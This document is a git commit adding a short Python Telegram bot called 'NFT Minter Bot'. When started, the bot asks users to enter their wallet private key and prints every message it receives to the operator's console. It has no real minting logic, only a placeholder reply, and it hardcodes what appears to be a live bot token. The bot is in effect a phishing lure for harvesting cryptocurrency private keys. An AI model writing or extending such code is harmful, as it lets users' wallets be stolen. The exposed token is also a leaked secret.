7c5d9a90f0471377f22d3b5732977d5faaf492ef
Sajad Salehi <102877977+Sajad-Salehi@users.noreply.github.com>
2022-07-26 22:01:58 +0430

    Add files via upload

---
+++ src/main.py
@@ -0,0 +1,32 @@
+from logging import Filter
+from telegram import *
+from telegram.ext import *
+from requests import *
+
+
+def startCommand(update, context):
+
+    update.message.reply_text("Hi! Welcome to NFT Minter Bot.\n\n\nPlease Enter Your Wallet (Private Key) :")
+    
+
+def private_key(update, context):
+
+    text = str(update.message.text)
+    print(text)
+
+    # Bot response
+    response = "responses.get_response(text)"
+    update.message.reply_text(response)
+
+if __name__ == "__main__":
+
+    updater = Updater("5585187752:AAE9alu2Zaji6bYCjAx95RTCN8hqWPtqYqY", use_context=True)
+    dp = updater.dispatcher
+
+    # Commands
+    dp.add_handler(CommandHandler('start', startCommand))
+    dp.add_handler(MessageHandler(Filters.text, private_key))
+
+    # Run the bot
+    updater.start_polling()
+    updater.idle()
